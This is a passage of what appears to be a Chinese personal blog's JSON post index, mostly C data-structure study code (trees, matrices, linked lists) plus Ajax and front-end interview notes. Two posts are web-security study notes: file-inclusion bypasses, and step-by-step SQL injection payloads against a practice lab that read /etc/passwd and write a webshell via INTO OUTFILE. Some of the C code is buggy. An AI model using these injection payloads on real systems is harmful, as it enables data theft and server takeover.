if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    &#123;\n        parent->lchild=p;\n        parent->ltag=0;\n    &#125;\n    else\n    &#123;\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n        parent->ltag=0;\n    &#125;\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n&#125;\n\nBiThrTree InsertTreeRightNode(BiThrTree T,Elemtype x,BiThrTree parent)\n&#123;\n    BiThrTree p;\n    if(parent==NULL)\n    &#123;\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    &#125;\n    if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    &#123;\n        parent->rchild=p;\n        parent->rtag=0;\n    &#125;\n    else\n    &#123;\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n        parent->rtag=0;\n    &#125;\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n&#125;\n\n\nint MiddleOrderTree(BiThrTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n&#125;\n\nBiThrTree MiddleOrderThr(BiThrTree T)\n\nBiThrTree DeleteTreeLeftNode(BiThrTree T,BiThrTree parent)\n&#123;\n    BiThrTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    &#123;\n        printf(\"No left child.\\n\");\n        return NULL;\n    &#125;\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n&#125;\n\nBiThrTree DeleteTreeRightNode(BiThrTree T,BiThrTree parent)\n&#123;\n    BiThrTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    &#123;\n        printf(\"No left child.\\n\");\n        return NULL;\n    &#125;\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n&#125;\n\nint PreOrderTree(BiThrTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n&#125;\n\n\n\nint LastOrderTree(BiThrTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n&#125;\n\nvoid LevelOrderTree(BiThrTree T)\n&#123;\n    BiThrTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    &#123;\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        &#123;\n            Queue[++rear]=Queue[front]->lchild;\n        &#125;\n        if(Queue[front]->rchild!=NULL)\n        &#123;\n            Queue[++rear]=Queue[front]->rchild;\n        &#125;\n    &#125;\n&#125;\n\n\n\nint main()\n&#123;\n    BiThrTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&amp;numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&amp;rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index&lt;numberOfNodes; index++)\n    &#123;\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&amp;choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&amp;nodedata);\n        switch(choice)\n        &#123;\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        &#125;\n    &#125;\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n&#125;\n\n\n\n\n\n3.哈夫曼树","slug":"Ch5 树","date":"2021-08-21T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"aa3121f0eb296174fb5353bf6a5b23c1","title":"特殊矩阵及广义表","content":"一、对称矩阵\nvoid PrintSymetryMatrix(int m[],int n)\n&#123;\n    int row,col;\n    printf(\"Symetry Matrix:\\n\");\n    for(row=0;row&lt;n;row++)\n    &#123;\n        for(col=0;col&lt;n;col++)\n        &#123;\n            if(row>=col)\n            &#123;\n                printf(\"%4d \",m[row*(row+1)/2+col]);\n            &#125;\n            else\n            &#123;\n                printf(\"%4d \",m[col*(col+1)/2+row]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\n​                    \n#include &lt;stdio.h>\n#include &lt;stdlib.h>\n#include &lt;string.h>\n\ntypedef int Elemtype;\n#define MaxSize 100\n\ntypedef struct\n&#123;\n    int rowIndex,colIndex;\n    Elemtype data;\n&#125; TriUnitGroup;\n\ntypedef struct\n&#123;\n    TriUnitGroup data[MaxSize+1];\n    int unzeroNumber,colNumber,rowNumber;\n&#125; TSMatrix;\n\nint main()\n&#123;\n    TSMatrix *myMatrix;\n    int myData[16]= &#123;1,2,0,3,4,6,0,0,0,4,0,1,3,1,1,0&#125;;\n    CreateM(&amp;myMatrix,myData,4,4);\n    PrintTripleUnitMatrix(&amp;myMatrix);\n\n    return 0;\n&#125;\n\n\nint CreateM(TSMatrix *M,int data[],int row,int col)\n&#123;\n\n    int index=0;\n    int count=0;\n\n    for(index=0; index&lt;row*col; index++)\n    &#123;\n        if(data[index]!=0)\n        &#123;\n            M->data[count].rowIndex=index/col;\n            M->data[count].colIndex=index%col;\n            M->data[count].data=data[index];\n            ++count;\n            printf(\"%d Add data %d successfully.\\n\",count,data[index]);\n        &#125;\n    &#125;\n\n    if(count>0)\n    &#123;\n        printf(\"Data number:%d.\\n\",count);\n        /*Errors here.*/\n        M->unzeroNumber=count;\n        M->colNumber=col;\n        M->rowNumber=row;\n        printf(\"Finished.\\n\");\n        return 1;\n    &#125;\n    else\n    &#123;\n        printf(\"All data are 0.\\n\");\n        printf(\"Finished.\\n\");\n        return 0;\n    &#125;\n\n&#125;\n\nvoid PrintTripleUnitMatrix(TSMatrix *M)\n&#123;\n    printf(\"*  i  j  value\\n\");\n    for(int index1=0; index1&lt;M->unzeroNumber; index1++)\n    &#123;\n        printf(\"%d  %d  %d  %d\\n\",index1,M->data[index1].rowIndex,M->data[index1].colIndex,M->data[index1].data);\n    &#125;\n    return;\n&#125;\n\n\nvoid PrintSymmetricArray(int array[],int col,int row)\n&#123;\n    int col_index,row_index;\n\n    for(col_index=0; col_index&lt;col; col_index++)\n    &#123;\n        for(row_index=0; row_index&lt;row; row_index++)\n        &#123;\n            if(col_index&lt;=row_index)\n            &#123;\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\nvoid PrintUpTriangle(int array[],int col,int row)\n&#123;\n    for(int index1=0; index1&lt;col; index1++)\n    &#123;\n        for(int index2=0; index2&lt;row; index2++)\n        &#123;\n            if(index1&lt;index2)\n            &#123;\n                printf(\"%d \",array[0]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\nvoid PrintDownTriangle(int array[],int col,int row)\n&#123;\n    for(int index1=0; index1&lt;col; index1++)\n    &#123;\n        for(int index2=0; index2&lt;row; index2++)\n        &#123;\n            if(index1>index2)\n            &#123;\n                printf(\"%d \",array[0]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\n\n\n","slug":"CH4 特殊矩阵广义表","date":"2021-08-20T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"e90fef94527ba0dbff46e9458222830c","title":"队列和栈","content":"Ch1 栈和队列\n","slug":"Ch2 队列和栈","date":"2021-08-15T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"f827cbb80b8c49cdec8fd12f9ea90f25","title":"Autumn_XDU","content":"XDU的秋天\n呜呜呜,XD的秋天也太好看了吧~~\n\n","slug":"XDU-Autumn","date":"2021-08-08T16:00:46.000Z","categories_index":"日常","tags_index":"摄影,日常","author_index":"Martin"},{"id":"d9e48ebde6ac3449bf916754850ccddb","title":"顺序表","content":"CH1 顺序表基本操作及实现（C）\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n\n#define MAXSIZE 50\n#define Elemtype int \n\ntypedef struct&#123;\n    Elemtype data[MAXSIZE];\n    int length;\n&#125;Sqlist;\n\nvoid InitSqlist(Sqlist *L)\n&#123;\n    L->length=0;\n    printf(\"Init the list successfully!\\n\");\n    return;\n&#125;\n\nvoid CreateSqlist(Sqlist *L,int temp_data[],int temp_length)\n&#123;\n    if(temp_length>MAXSIZE)\n    &#123;\n        printf(\"Overflow!\\n\");\n        return;\n    &#125;\n\n    for(int index=0;index&lt;temp_length;index++)\n    &#123;\n        L->data[index]=temp_data[index];\n    &#125;\n    L->length=temp_length;\n    printf(\"Create the table successfully!\\n\");\n    return;\n&#125;\n\nvoid InsertList(Sqlist *L,Elemtype newData,int temp_position)\n&#123;\n    if(temp_position&lt;0||temp_position>L->length+1)\n    &#123;\n        printf(\"Wrong position!\\n\");\n        return;\n    &#125;\n    else\n    &#123;\n        for(int index=L->length;index>temp_position;index--)\n        &#123;\n            L->data[index]=L->data[index-1];\n        &#125;\n        L->data[temp_position]=newData;\n        printf(\"Add new data successfully!\\n\");\n        return;\n    &#125;\n&#125;\n\nvoid DeleteDataByElement(Sqlist *L,Elemtype deletedData)\n&#123;\n    int counter=0;\n    for(int index=0;index&lt;L->length-1;index++)\n    &#123;\n        if(L->data[index]==deletedData)\n        &#123;\n            counter+=1;\n            for(int index1=index;index1&lt;L->length-1;index1++)\n            &#123;\n                L->data[index1]=L->data[index1+1];\n            &#125;\n        &#125;\n    &#125;\n    L->length-=counter;\n    printf(\"The counter is %d\\n\",counter);\n    printf(\"Delete the data successfully!\\n\");\n    return;\n&#125;\n\nvoid DeleteDataByPosition(Sqlist *L,int tempDeletePosition)\n&#123;\n    Elemtype deleted_data;\n    if(tempDeletePosition&lt;0||tempDeletePosition>L->length)\n    &#123;\n        printf(\"Wrong position!\\n\");\n    &#125;\n    else&#123;\n        deleted_data=L->data[tempDeletePosition];\n        for(int index=tempDeletePosition;index&lt;L->length;index++)\n        &#123;\n\n            L->data[index]=L->data[index+1];\n        &#125;\n        L->length--;\n    &#125;\n    printf(\"Delete the data successfully!\\n\");\n    printf(\"The deleted data is %d\\n\",deleted_data);\n    return;\n&#125;\n\n//按值查找\nint Locate_Data(Linklist L,ElemType targetData)\n&#123;\n    LNode *p;\n    p=L->next;\n    int index=0;\n    while(p)\n    &#123;\n        if(p->data==targetData)\n        &#123;\n            printf(\"Position:%d.\\n\",index);\n            return index;\n        &#125;\n        index++;\n        p=p->next;\n    &#125;\n    printf(\"No such a data.\\n\");\n    return -1;\n&#125;\n\n//计算链表长度\nint CountLinklistLength(Linklist L)\n&#123;\n    int count=0;\n    LNode *p;\n    p=L->next;\n    while(p)\n    &#123;\n        count++;\n        p=p->next;\n    &#125;\n    printf(\"List length : %d.\\n\",count);\n    return count;\n&#125;\n\nvoid PrintList(Sqlist *L)\n&#123;\n    printf(\"The list is below:\\n\");\n    for(int index=0;index&lt;L->length;index++)\n    &#123;\n        printf(\"%d \",L->data[index]);\n    &#125;\n    printf(\"\\nThe length is %d\\n\",L->length);\n    return;\n&#125;\n\n//不确定是否正确\n// void EmptyList(Sqlist *L)\n// &#123;\n//     free(L->data);\n//     L->length=0;\n//     return;\n// &#125;\n\n\n\nint main()&#123;\n    int my_data[MAXSIZE]=&#123;1,2,3,4,5,6,4,3,22,1&#125;;\n    int my_length=10;\n    Sqlist my_list;\n    Elemtype insertData=10;\n    int my_new_position=3;\n    int my_abandoned_data=3;\n    int my_deleted_position=2;\n\n    InitSqlist(&amp;my_list);\n    CreateSqlist(&amp;my_list,my_data,my_length);\n    InsertList(&amp;my_list,insertData,my_new_position);\n    PrintList(&amp;my_list);\n    DeleteDataByElement(&amp;my_list,my_abandoned_data);\n    DeleteDataByPosition(&amp;my_list,my_deleted_position);\n    // EmptyList(&amp;my_list);\n    PrintList(&amp;my_list);\n    return 0;\n&#125;\n\n统一使用头节点后的代码实现：\nLinklist Create_Linklist(int n)\n&#123;\n    LNode *L,*p,*q;\n    int i;\n    L=(LNode*)malloc(sizeof(LNode));\n    L->next=NULL;           //Head node;\n    q=L;                    //q->L;\n    for(i=0;i&lt;n;i++)\n    &#123;\n        p=(LNode*)malloc(sizeof(LNode));\n        printf(\"Pelase enter data %d:\",i);\n        scanf(\"%d\",&amp;p->data);\t\t\t //q=L,p赋值\n        p->next=NULL;\t\t\t\t\t//q=L, p->NULL\n        q->next=p;\t\t\t\t\t\t//q->p->NULL==L->p->null;\n        q=p;\t\t\t\t\t\t\t\n    &#125;\t\t\t\t\t\t\t\t\t\n    return L;\n&#125;\n\nint InsertData(Linklist L,ElemType data,int pos)\n&#123;\n    LNode *p,*s;\n    int index;\n    p=L;\n    index=-1;\t\t\t\t\t\t//index设置为-1，则从0开始计算链表长度\n    while(p&amp;&amp;index&lt;pos-1)\t\t\t//循环找到目标元素的前一个元素\n    &#123;\n        p=p->next;\n        index++;\n    &#125;\n    if(!p||index>pos-1)\t\t\t\t//p的下一个为空则不存在；index大于pos则出错；\n    &#123;\n        printf(\"Wrong position.\\n\");\n        return -1;\n    &#125;\n    s=(LNode*)malloc(sizeof(LNode));\t//创建新空间\n    s->data=data;\t\t\t\t\t\n    s->next=p->next;\t\t\t//s=target\n    p->next=s;\t\t\t\t\t//p->s,s->target\n    printf(\"Insert the data successfully.\\n\");\n    return 1;\n&#125;\n\nint DeleteData(Linklist L,ElemType *e,int pos)   //*e可以获得目标元素的地址\n&#123;\n    LNode *p,*q;\n    p=L->next;\t\t\t\t\t\t\t\n    int index=-1;\n    while(p->next&amp;&amp;index&lt;pos-1)\n    &#123;\n        p=p->next;\n        index++;\n    &#125;\n    if(!(p->next)||index>pos-1)\n    &#123;\n        printf(\"Wrong position.\\n\");\n        return -1;\n    &#125;\n    q=p->next;\n    *e=q->data;\t\t\t\t\t//将data传入e\n    p->next=q->next;\n    free(q);\n    printf(\"Get the data: %d\\n\",*e);\n    return 1;\n\n&#125;\n\n//合并两个有序链表，且合成的链表也是顺序的\nLinklist MergeLinklist(Linklist A,Linklist B)\n&#123;\n    LNode *pa,*pb,*pc,*C;\n    pa=A->next;\n    pb=B->next;\n    C=pc=A;\t\t\t\t\t\t//C=A\n    while(pa&amp;&amp;pb)\n    &#123;\n        if(pa->data&lt;=pb->data)\n        &#123;\n            pc->next=pa;\t\t//c->a1;\n            pc=pa;\t\t\t\t//c=a1;\n            pa=pa->next;\t\t//a1=a2\n        &#125;\n        else\n        &#123;\n            pc->next=pb;\n            pc=pb;\n            pb=pb->next;\n        &#125;\n    &#125;\n    pc->next=pa?pa:pb;\n    free(B);\n    return C;\n\n&#125;\n\nvoid PrintLinklist(Linklist L)\n&#123;\n    LNode *p;\n    p=L->next;\n    printf(\"DATA OUTPUT:\");\n    while(p)\n    &#123;\n        printf(\"%d \",p->data);\n        p=p->next;\n    &#125;\n    printf(\"\\n\");\n&#125;\n\nint main()\n&#123;\n    int e;\n\n    Linklist MyLinklist;\n    MyLinklist=Create_Linklist(5);\n    PrintLinklist(MyLinklist);\n    InsertData(MyLinklist,101,3);\n    PrintLinklist(MyLinklist);\n    DeleteData(MyLinklist,&amp;e,3);    //Use &amp; to get data;\n    PrintLinklist(MyLinklist);\n\n\n\n    return 0;\n&#125;\n\n二、双向链表\n#include &lt;stdio.h>\n#include &lt;stdlib.h>\n\ntypedef int Elemtype;\n\n//节点结构\ntypedef struct DulNode&#123;\n    struct DulNode * prior;\n    int data;\n    struct DulNode * next;\n&#125;DulNode,*DulLinkList;\n\nDulNode* initDulNode(DulNode * L,int length)&#123;\n    //创建一个首元节点，链表的头指针为L\n    L=(DulNode*)malloc(sizeof(DulNode));\n    //对节点进行初始化\n    L->prior=NULL;\n    L->next=NULL;\n    L->data=NULL;\n    //声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点\n    DulNode *r=L;\n    for (int count=0; count&lt;length; count++) &#123;\n        //创建新的节点并初始化\n        DulNode *p=(DulNode*)malloc(sizeof(DulNode));\n        p->prior=NULL;\n        p->next=NULL;\n        printf(\"Please enter data %d:\",count);\n        scanf(\"%d\",&amp;p->data);\n        //新节点与链表最后一个节点建立关系\n        r->next=p;\n        p->prior=r;\n        //r永远指向链表中最后一个节点，重点！！！！\n        r=r->next;\n    &#125;\n    //返回新创建的链表\n    return L;\n&#125;\nvoid display(DulNode * L)&#123;\n    DulNode *temp=L->next;\n    while (temp) &#123;\n        //如果该节点无后继节点，说明此节点是链表的最后一个节点\n        if (temp->next==NULL) &#123;\n            printf(\"%d\\n\",temp->data);\n        &#125;else&#123;\n            printf(\"%d &lt;-> \",temp->data);\n        &#125;\n        temp=temp->next;\n    &#125;\n&#125;\n\n\nint main() &#123;\n    //创建一个头指针\n    DulNode * L=NULL;\n    //调用链表创建函数\n    L=initDulNode(L,5);\n    //输出创建好的链表\n    display(L);\n    //显示双链表的优点\n    return 0;\n&#125;\n\n\n\n","slug":"CH1 顺序表基本操作及实现（C）","date":"2021-08-08T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"85b49fe66b43ca226c264187ac889eda","title":"关于C语言的一些奇奇怪怪","content":"#include &lt;stdio.h>\n#include &lt;stdlib.h>\n\n#define INIT_SIZE 5\n#define INCREMENT 2\n\ntypedef int ElemType;\ntypedef struct&#123;\n    ElemType *data;\n    int length;\n    int list_length;\n&#125;SqList;\n\nint InitList_Sq(SqList *L)\n&#123;\n    L->data=(ElemType *)malloc(INIT_SIZE*sizeof(ElemType));\n    if(!L->data)&#123;\n        return -1;\n    &#125;\n    L->length=0;\n    L->list_length=INIT_SIZE;\n    return 1;\n&#125;\n\nint ListInsert(SqList *L,int index,ElemType temp_data)\n&#123;\n    int j;\n    ElemType *newBase;\n    if(index&lt;0 || index>L->length)\n    &#123;\n        //realloc重新分配\n        newBase=(ElemType *)realloc(L->data,(L->list_length+INCREMENT)*sizeof(ElemType));\n        if(!newBase)\n        &#123;\n            return -1;\n        &#125;\n        L->data=newBase;\n        L->list_length+=INCREMENT;\n    &#125;\n    for(j=L->length-1;j>=index;j--)\n    &#123;\n        L->data[j+1]=L->data[j];\n    &#125;\n    L->data[index]=temp_data;\n    L->length++;\n    return 1;\n&#125;\n\nint DeleteList(SqList *L,int pos)\n&#123;\n    if(pos&lt;0||pos>L->length)\n    &#123;\n        printf(\"Wrong position.\\n\");\n        return 0;\n    &#125;\n    for(int index=pos;index&lt;L->length;index++)\n    &#123;\n        L->data[index]=L->data[index+1];\n    &#125;\n    L->length--;\n    return 1;\n&#125;\n\nint FindElem(SqList *L,ElemType target)\n&#123;\n    if(!L->data)\n    &#123;\n        printf(\"Empty table.\\n\");\n        return -1;\n    &#125;\n    for(int index=0;index&lt;L->length;index++)\n    &#123;\n        if(target==L->data[index])\n        &#123;\n            printf(\"Find at %d.\\n\",index);\n            return index;\n        &#125;\n    &#125;\n    printf(\"No such a data.\\n\");\n    return -1;\n&#125;\n\nvoid PrintList(SqList *L)\n&#123;\n    for(int index=0;index&lt;L->length;index++)\n    &#123;\n        printf(\"%d \",L->data[index]);\n    &#125;\n    printf(\"\\n\");\n&#125;\n\n\nint main()\n&#123;\n    SqList *Mylist;\n    InitList_Sq(Mylist);\n\n    for(int count=0;count&lt;INIT_SIZE;count++)\n    &#123;\n        ListInsert(Mylist,0,count);\n    &#125;\n\n    PrintList(Mylist);\n\n    DeleteList(Mylist,3);\n\n    PrintList(Mylist);\n    printf(\"Find 2 in %d.\\n\",FindElem(Mylist,2));\n    return 0;\n&#125;\n\n\n实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；\n","slug":"C语言-顺序表","date":"2021-08-08T12:56:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"aa3121f0eb296174fb5353bf6a5b23c1","title":"特殊矩阵及广义表","content":"#include &lt;stdio.h>\n#include &lt;stdlib.h>\n#include &lt;string.h>\nint main()\n&#123;\n    //存贮数据的数组\n    int Myarray[10]=&#123;10,5,7,3,12,20,17,4,23,14&#125;;\n\n    int arryLength=(strlen(Myarray)-2)/2;\n\n    printf(\"%d \",arryLength);\n    PrintSymmetricArray(Myarray,arryLength,arryLength);\n\n    return 0;\n&#125;\n\nvoid PrintSymmetricArray(int array[],int col,int row)\n&#123;\n    int col_index,row_index;\n\n    for(col_index=0; col_index&lt;col; col_index++)\n    &#123;\n        for(row_index=0; row_index&lt;row; row_index++)\n        &#123;\n            //转换的坐标为（x(x+1)/2+y）\n            if(col_index&lt;=row_index)\n            &#123;\n                printf(\"%d \",array[row_index*(row_index+1)/2+col_index]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[col_index*(col_index+1)/2+row_index]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\n\n1.对称矩阵\n2.上三角矩阵\n使用array[0]来存储常数项的值\nvoid PrintUpTriangle(int array[],int col,int row)\n&#123;\n    for(int index1=0;index1&lt;col;index1++)\n    &#123;\n        for(int index2=0;index2&lt;row;index2++)\n        &#123;\n            if(index1&lt;index2)\n            &#123;\n                printf(\"%d \",array[0]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[index1*(index1+1)/2+1+index2]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\n3.下三角矩阵\nvoid PrintDownTriangle(int array[],int col,int row)\n&#123;\n    for(int index1=0;index1&lt;col;index1++)\n    &#123;\n        for(int index2=0;index2&lt;row;index2++)\n        &#123;\n            if(index1>index2)\n            &#123;\n                printf(\"%d \",array[0]);\n            &#125;\n            else\n            &#123;\n                printf(\"%d \",array[index2*(index2+1)/2+1+index1]);\n            &#125;\n        &#125;\n        printf(\"\\n\");\n    &#125;\n    return;\n&#125;\n\n\n","slug":"特殊矩阵和广义表","date":"2021-08-08T12:56:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"fbb97311aca413409ad49ad63dd42c9d","title":"文件包含漏洞","content":"一、Defs​    可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；\n​    由于传入的文件没有经过检验，动态包含文件，导入了意料之外的文件导致文件泄露和恶意代码注入；\n1.常用导入函数​    include,require,fopen,readfile等；\n（1）include， require的区别​    include包含文件报错会继续运行，但是require会中断脚本运行；\n（2）include_once（）,require_once​    仅包含一次同一个文件，若包含两次就终止脚本；\n（3） fopen（），readfile（）readfile读取到缓存区，返回一个整数； fopen返回一个指针；\n二、分类1.本地文件漏洞（LFI）可以包含本地服务器的文件（通过上传传输到服务器），获得权限\n（1）文件在同一文件夹下\n（2）不在同一目录需要使用相对或绝对目录；\n2.方法：%00(PHP5.3.4一下才能使用)；\n重复.././防止字符串替换\n3.远程文件漏洞（RFI）类似于代码注入，将一段在外地的代码执行；\n前提：\n（1）allow_url_fopen()    allow_url_include()\n（2）\n（3）\n1=http://127.0.0.1:82/test.txtz\n","slug":"文件包含漏洞","date":"2021-07-22T03:21:00.000Z","categories_index":"网络安全","tags_index":"Web,Security","author_index":"Martin"},{"id":"236d610796a3ca78ed573065000889bd","title":"SQL注入步骤","content":"SQL注入漏洞1、找注入点（’ “ ) ))）select * from users where id =’1’#’ limit 0,1;http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#\n2、判断是否存在注入select * from users where id =’1’ and 1=1#’ limit 0,1;select * from users where id =’1’ and 1=2#’ limit 0,1;\n3、判断列数select * from users where id =’1’ order by 3#’ limit 0,1;\n4、判断显示位select * from users where id =’-1’ union select 1,2,3#’ limit 0,1\n5、爆用户、爆库select * from users where id =’-1’ union select 1,user(),3#’ limit 0,1http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39; union select 1,user(),database()–+\n6、爆数据表名group_concat()select * from users where id =’-1’ unoin select 1,user(),table_name from information_schema.tables where table_schema=”security” limit 0,1#’ limit 0,1;\n7、爆数据列名select * from users where id =’-1’ unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”#’ limit 0,1;http://1c96113c.yunyansec.com/Less-1/?id=-1&#39; union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”–+\n8、获取数据select * from users where id =’-1’ unoin select 1,user(),group_concat(id,username,password) from users#’ limit 0,1;\n9、读取服务器敏感文件load_file(“/etc/passwd”)?id=-1’ union select 1,2,load_file(“/etc/passwd”)%2310、获取服务器权限，写入木马?id=-1’ union select 1,2,’‘ into outfile ‘/var/www/html/2.php’%23\nselect * from users where uname=’admin’#’ and passwd=’123456’\n","slug":"SQL注入","date":"2021-07-22T03:20:00.000Z","categories_index":"网络安全","tags_index":"Web,SQL","author_index":"Martin"},{"id":"443175316fe2bc45d543d31728717318","title":"Ajax","content":"AJAXAsynchronous Javascript and XML;(异步的javascript和XML)。\n\n✨无须更新整个网页的情况下，更新部分网页；\n传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；\n增强了B/S（浏览器/服务器）的体验性；\n高可用，更丰富，更动态；\nAjax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。variable=new XMLHttpRequest();\n\n1.发送请求open和send方法\nxmlhttp.open(\"GET\",\"test1.txt\",true);\nxmlhttp.send();\n\n\n\n\n方法\n描述\n\n\n\nopen（method，url，async）\nmethod：GET POST；url:文件在服务器的位置；async：true同步，false异步；\n\n\nsend（string）\n将请求发送到服务器：string：仅适用于POST\n\n\n2.GET 还是 POST？\n与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。\n然而，在以下情况中，请使用 POST 请求：\n\n无法使用缓存文件（更新服务器上的文件或数据库）\n向服务器发送大量数据（POST 没有数据量限制）\n发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠\n\n3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：\n\n在等待服务器响应时执行其他脚本\n当响应就绪后对响应进行处理\n\n","slug":"Ajax","date":"2021-04-12T15:41:10.000Z","categories_index":"前端","tags_index":"笔记,面试","author_index":"Martin"},{"id":"26c58976fec82d7921ed276f388f2352","title":"YK大佬的面试题","content":"##前端面试问题一、JS1.JS中的基础数据类型：  6种，undefined，null，boolean，string，number，symbol；2.let和var的区别    let：有作用域，不会出现变量提升，不与全局环境挂钩；3.this是什么？    this是一种指向，在运行的时候，会指向最后调用它的对象；4.怎么判断一个变量是什么数据类型？typeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；5.ajax    局部更新不刷新整个页面；6.promise基本了解            为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；7.async/await            将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；8.dom操作有哪些？            \n二、CSS1.居中，块级和行内行内：text-align：center；块级：首先定义宽度，margin：0，auto；其他方法：父元素display设为flex。加上一句话:justify-content；center；2.垂直居中父元素display设为flex。加上一句话:justify-content；center；align-items：center；3.float布局以及缺点，文档流；缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；4.position的属性有哪些？abosulte:绝对定位  子元素位置根据父元素决定fixed:固定定位     跟据浏览器决定 ，relative：相对定位 根据应该出现的位置定位；5.flex布局          是一个弹性的伸缩盒子模型\n三、vue1.组件通信2.为什么子组件的数据需要用函数形式，根组件不用；3.computed/watch的用法和区别；4.router了解\n","slug":"前端","date":"2021-04-12T15:41:10.000Z","categories_index":"前端","tags_index":"笔记,面试","author_index":"Martin"},{"id":"81579b6c641dedc829a2b0058112fc0c","title":"数据结构","content":"关于Dijkstra算法✔重要\n1.基本原理假设它的起点是 a ，要求它到各点的最短距离\nDijkstra 思路是维护一个集合 s 